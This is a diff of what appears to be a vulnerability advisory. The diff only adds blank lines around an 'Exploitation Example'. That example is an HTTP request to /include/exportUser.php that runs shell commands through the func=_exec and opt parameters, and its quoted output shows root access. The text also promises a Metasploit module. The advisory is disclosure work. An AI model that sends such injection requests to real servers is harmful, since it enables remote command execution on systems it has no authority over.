@@ -125,6 +125,8 @@ After executing this request, we have a file named "test.txt" in "/include" dire
 
 ### Exploitation Example:
 
+
+
 ```  
 GET /include/exportUser.php?type=3&cla=application&func=_exec&opt=whoami&echo "erkan" > test.txt
 HTTP/1.1
@@ -150,6 +152,8 @@ Content-Encoding: gzip
 uid=0(root) gid=0(root)
 erkan
 ```
+
+
 
 When we have a time we will also release the Metasploit Module for the vulnerability too.
 
